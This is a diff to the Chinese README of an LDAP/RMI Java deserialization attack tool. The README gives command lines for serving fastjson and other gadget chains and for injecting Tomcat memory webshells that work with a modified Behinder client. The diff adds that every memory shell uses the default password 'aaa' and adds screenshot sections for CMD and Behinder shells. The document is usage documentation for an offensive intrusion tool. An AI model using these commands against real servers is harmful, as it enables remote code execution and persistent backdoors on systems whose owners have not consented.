@@ -17,7 +17,7 @@ RMI反序列化打法：
 java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c "calc" -rmi
 RMI内置利用链遍历：
 java -jar LDAPDeserialize-tool.jar -g execAll -c "calc" -rmi -ip 当前服务器公网ip
-内存马打法：
+内存马注入：
 java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c TomcatListenerBehinderByLei
 ```
 #### 参数说明
@@ -50,6 +50,7 @@ rome (依赖：Rome 1.0)
 execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)
 
 【目前支持的内存马类型】
+目前所有内存马默认密码均为：aaa
 TomcatListenerBehinderByLei (打入改版的马子，需用改版的冰蝎ByLei)
 ```
 
@@ -76,7 +77,15 @@ TomcatListenerBehinderByLei (打入改版的马子，需用改版的冰蝎ByLei)
 
 ![截图](image/e49210b2672c44f1ba10bd784bbefc56.png)
 
-#### 内存马打法
+#### 内存马注入
+##### CMD马
+
+![截图](image/Snipaste_2024-08-06_17-10-12.png)
+
+![截图](image/Snipaste_2024-08-06_17-14-38.png)
+
+
+##### 冰蝎马
 
 ![截图](image/image-20240806154150477.png)
 
